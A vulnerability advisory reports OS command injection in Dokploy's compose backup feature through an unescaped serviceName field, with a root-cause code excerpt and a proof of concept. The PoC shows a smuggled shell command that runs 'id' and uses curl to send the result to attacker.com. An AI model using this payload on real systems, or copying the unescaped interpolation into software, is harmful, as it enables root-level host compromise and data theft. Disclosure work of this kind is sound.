title: OS Command Injection via serviceName in Compose Backup
summary:
## Summary

The serviceName field accepted by backup.create and backup.update is interpolated directly into a shell command string without sanitization or escaping. The injected command executes as root inside the Dokploy container at the next scheduled cron tick (default: every minute). Because Dokploy mounts /var/run/docker.sock on standard installations, this leads to full host compromise.

Critically, exploitation requires only a member-level account - no admin or owner privileges are needed. A member with access to a single project can create a backup with an injected serviceName targeting any destination already registered in the organization.


## Root Cause

packages/server/src/utils/backups/utils.ts, function getComposeContainerCommand (lines 246-256), interpolates serviceName directly into a shell string:

```javascrip
export const getComposeContainerCommand = (
  appName: string,
  serviceName: string,
  composeType: "stack" | "docker-compose" | undefined,
) => {
  // serviceName is never validated or shell-escaped
  return `docker ps -q --filter "status=running" \
--filter "label=com.docker.compose.project=${appName}" \
--filter "label=com.docker.compose.service=${serviceName}" | head -n 1`;
};
```

The backup executes via execAsync(backupCommand, { shell: "/bin/bash" }). The schedule defaults to */1 * * * *, so the payload executes within 60 seconds of creation.

The Zod schema for backup.create applies z.string() to serviceName with no regex or character restriction, while other shell-adjacent fields in the same schema (appName, additionalFlags) are guarded by strict validators.


## Proof of Concept

Prerequisites: A Dokploy instance, any member-level account with access to at least one project, and an existing destinationId (no credential access needed - just the ID).

Step 1 - Sign in as a low-privilege member:

```bash
POST /api/auth/sign-in/email
{"email": "member@example.com", "password": "..."}
```

Step 2 - Create or use an existing compose app in an accessible project:

```bash
POST /api/trpc/compose.create
{"json": {"name": "poc-app", "appName": "poc-app",
           "composeType": "docker-compose", "environmentId": "<envId>"}}
```

Step 3 - Create a backup with an injected serviceName:

```bash
POST /api/trpc/backup.create
{"json": {
  "backupType":    "compose",
  "composeId":     "<composeId>",
  "destinationId": "<any valid destinationId>",
  "serviceName":   "svc\" ; OUTPUT=$(id) ; curl -sk --data \"$OUTPUT\" https://attacker.com/collect ; echo \"",
  "schedule":      "*/1 * * * *",
  "enabled":       true,
  "prefix":        "poc",
  "database":      "poc",
  "databaseType":  "postgres"
}}
```
```bash
Response: HTTP 200 {"json": null} - accepted without validation.
```

Step 4 - Wait up to 60 seconds. The attacker's server receives:

```bash
uid=0(root) gid=0(root) groups=0(root)
```
